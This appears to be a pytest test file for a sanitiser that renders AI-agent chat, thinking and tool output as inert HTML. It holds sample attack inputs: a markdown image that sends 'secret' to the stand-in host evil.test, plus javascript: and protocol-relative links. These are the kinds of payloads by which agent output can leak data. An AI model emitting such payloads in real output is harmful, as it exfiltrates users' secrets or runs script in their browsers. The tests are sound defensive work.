import html
from html.parser import HTMLParser

import pytest

from panel_agents import RunState
from panel_agents import events as ev
from panel_agents.components.chat import AgentChat
from panel_agents.components.renderers import output_format, render, render_output
from panel_agents.security import (
    _escape_markdown,
    set_trusted_image_origins,
    trusted_image_origins,
    untrusted_markdown,
)

from .sanitiser_payloads import PAYLOADS, img, tool_output_variants


@pytest.fixture(autouse=True)
def no_trusted_origins():
    set_trusted_image_origins([])
    yield
    set_trusted_image_origins([])


def html_of(pane):
    """The HTML a pane sends to the browser, through Panel's public model API."""
    from bokeh.document import Document

    return html.unescape(pane.get_root(Document()).text)


def rendered(text):
    return html_of(untrusted_markdown(text))


class _Tags(HTMLParser):

    def __init__(self):
        super().__init__()
        self.tags = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))


def assert_inert(html):
    """No element that loads or runs anything, judged on the parsed HTML rather than its text."""
    parser = _Tags()
    parser.feed(html)
    for tag, attrs in parser.tags:
        assert tag not in ("img", "iframe", "base", "meta", "link", "style", "script", "svg", "object", "embed", "source"), html
        assert not any(name.startswith("on") or name in ("style", "srcset", "src") for name in attrs), html
        href = (attrs.get("href") or "").strip().lower()
        assert not href.startswith(("javascript", "vbscript", "data", "//")), html


@pytest.mark.parametrize("name", list(PAYLOADS))
def test_payload_renders_inert(name):
    assert_inert(rendered(PAYLOADS[name]))


def test_images_become_links_that_show_their_url():
    html = rendered("![x](https://evil.test/?d=secret)")
    assert '<a href="https://evil.test/?d=secret">image: x</a>' in html
    assert "<code>https://evil.test/?d=secret</code>" in html


def test_links_show_their_url_and_unsafe_schemes_are_text():
    assert "<code>https://docs.example/a</code>" in rendered("[docs](https://docs.example/a)")
    assert "<code>" not in rendered("[https://a.example](https://a.example)")
    assert "<a" not in rendered("[click](javascript:alert(1))")
    assert "<a" not in rendered("[x](//evil.test/x)")


def test_math_is_not_typeset():
    pane = untrusted_markdown("$$\\href{javascript:x}{y}$$")
    model = pane.get_root(__import__("bokeh.document", fromlist=["Document"]).Document())
    assert model.disable_math and "\\href" in html.unescape(model.text)


def test_trusted_origins_allow_their_images():
    set_trusted_image_origins(["https://tiles.example/"])
    assert trusted_image_origins() == {"https://tiles.example"}
    assert '<img src="https://tiles.example/a.png"' in rendered("![m](https://tiles.example/a.png)")
    assert "<img" not in rendered("![m](https://evil.test/a.png)")
    set_trusted_image_origins(["*"])
    assert "<img" in rendered("![m](https://evil.test/a.png)")
    assert_inert(rendered(img("raw")))


def test_raster_data_images_are_kept_and_svg_is_not():
    assert "<img" in rendered("![p](data:image/png;base64,AAAA)")
    assert "<img" not in rendered("![p](data:image/svg+xml;base64,AAAA)")


def test_plain_text_escaping():
    text = img("plain") + " **bold** [l](https://x) $$x$$"
    out = html_of(untrusted_markdown(_escape_markdown(text)))
    assert_inert(out)
    assert "<strong>" not in out and "<a" not in out


def test_chat_text_and_thinking_are_inert():
    state = RunState(flush_interval=0)
    state.apply_many([
        ev.RunStarted(run_id="r"),
        ev.ThinkingStart(message_id="t", run_id="r"),
        ev.ThinkingContent(message_id="t", delta=img("think"), run_id="r"),
        ev.TextMessageStart(message_id="m", run_id="r"),
        ev.TextMessageContent(message_id="m", delta=PAYLOADS["nested_brackets"], run_id="r"),
    ])
    chat = AgentChat(state)
    message_pane = chat.view_for(state.messages["m"]).object
    thinking_pane = chat.view_for(state.messages["t"]).objects[0]
    for pane in (message_pane, thinking_pane):
        assert inert_pane(pane)
        assert_inert(html_of(pane))


def inert_pane(pane):
    from panel_agents.security import inert_markdown

    return pane.disable_math and inert_markdown in pane.plugins


@pytest.mark.parametrize("kind", [None, "text", "markdown", "unknown-kind"])
def test_text_results_and_artifacts_are_inert(kind):
    pane = render(img("result"), kind=kind)
    assert inert_pane(pane)


def test_objects_without_a_renderer_do_not_render_their_html():
    class Rich:
        def _repr_html_(self):
            return img("repr_html")

        def __str__(self):
            return "Rich object"

    import panel as pn

    pane = render(Rich())
    assert isinstance(pane, pn.pane.Str)


def _panes(viewable):
    import panel as pn

    if isinstance(viewable, pn.layout.ListLike):
        return [pane for obj in viewable for pane in _panes(obj)]
    return [viewable]


@pytest.mark.parametrize("name", list(PAYLOADS))
def test_payload_tool_outputs_render_inert(name):
    import panel as pn

    for variant, value in tool_output_variants(PAYLOADS[name]).items():
        for pane in _panes(render_output(value, max_lines=3)):
            if isinstance(pane, pn.widgets.Widget):
                continue
            assert inert_pane(pane), (variant, pane)
            assert_inert(html_of(pane))


def test_tool_output_variants_take_each_render_path():
    formats = {variant: output_format(value)[0] for variant, value in tool_output_variants("a\nb").items()}
    assert formats == {"text": "text", "dict": "json", "list": "json", "json_string": "json", "yaml": "yaml", "python": "python"}


def test_code_blocks_escape_html_even_if_highlighting_fails():
    from markdown_it import MarkdownIt

    from panel_agents.security import inert_markdown

    assert_inert(rendered("```python\n" + img("hilite") + "\n```"))

    def broken(code, lang, attrs):
        raise RuntimeError

    for highlight in (broken, lambda code, lang, attrs: code):
        md = MarkdownIt("gfm-like").use(inert_markdown)
        md.options["highlight"] = highlight
        out = md.render("```python\n" + img("fence") + "\n```")
        assert_inert(out)
        assert "&lt;img" in out


def test_error_and_args_of_a_tool_call_are_inert():
    from panel_agents.components.tool_call import ToolCallCard

    state = RunState(flush_interval=0)
    state.apply_many([
        ev.ToolCallStart(tool_call_id="c", tool_name="t"),
        ev.ToolCallArgs(tool_call_id="c", delta='{"body": "' + img("arg").replace('"', '\\"') + '", "code": "x = 1\\n' + img("code_arg").replace('"', '\\"') + '"}'),
        ev.ToolCallEnd(tool_call_id="c"),
        ev.ToolCallResult(tool_call_id="c", content="Traceback:\n" + img("error"), is_error=True),
    ])
    card = ToolCallCard(state.tool_calls["c"])
    assert inert_pane(card._args)
    assert_inert(html_of(card._args))
    assert_inert(html_of(card._error_text))
    assert "&lt;img" in card._error_text.object
